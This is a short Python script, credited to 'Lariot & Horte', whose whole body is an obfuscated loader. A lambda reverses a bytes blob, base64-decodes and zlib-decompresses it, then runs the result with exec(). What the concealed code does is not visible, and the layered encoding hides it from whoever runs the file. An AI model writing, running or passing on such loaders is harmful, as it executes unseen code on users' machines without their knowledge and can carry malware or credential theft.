
# Code By Lariot & Horte

# Country: Madagasikara
_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'=A/k6jzD5P/jSaG7e9LZ194kSzZk1VXBRL4H7UTst+vJueUBXKbborh+en2w3gM/ef7/Wd4un7n+YgLre3Ho2Zd7aWxSf1VwSKDSLyLm81tdmRGKmHBmY+Hq1yNudjY1bRcPtDfocD6rhMZxTuoyIbNXtoPio9aUfy1p0dvGxH7ihLFnfjn4ld5tBB7K3QCQMBQ/0mhVvz4Dox6KOKfEmyl4ivXoDV2h090sVvDF+w5XR6QXKcF/MWXaizJ4cxnjlxcsaQFqB7urRL3vRsDQmrQcIHVFjILFeO8imxeQzNAXcCVfD4NI89SVKuk0zUHuURGq6310jDycuuCsP1InBZV0LspKA1nBLiaLUZkGddaJVHkcrt3Emf6dI3QpxY9eeMvW4jFc8RrZwEquMmdPnPbimNXAN8NDtQWd+jujjhBwFqmlFJq2QhR/pM/nn6Uybciw/kM9tzQHicIAyzGOIoNHREYKsQiqL8BRjDNAAAkg2dE0NwJe'))